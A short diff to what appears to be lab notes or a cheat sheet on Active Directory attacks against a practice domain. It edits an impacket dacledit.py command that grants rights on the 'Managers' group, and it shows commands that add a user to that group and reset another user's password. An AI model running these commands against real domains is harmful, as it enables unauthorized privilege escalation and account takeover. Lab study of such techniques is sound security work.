@@ -1309,7 +1309,7 @@ setuserinfo2 kenta 23 Password1
 
 Own Target
 ```bash
-python3 examples/dacledit.py -principal own_user -target "Managers" -dc-ip 10.129.205.81 inlanefreight.local/own_user:Password1 -action 'write' -rights 'WriteMembers'
+python3 examples/dacledit.py -principal own_user -target "Managers" -dc-ip 10.129.205.81 inlanefreight.local/own_user:Password1 -action 'write'
 
 net rpc group addmem "Managers" "own_user" -U inlanefreight.local/own_user%Password1 -S 10.129.205.81
 ```
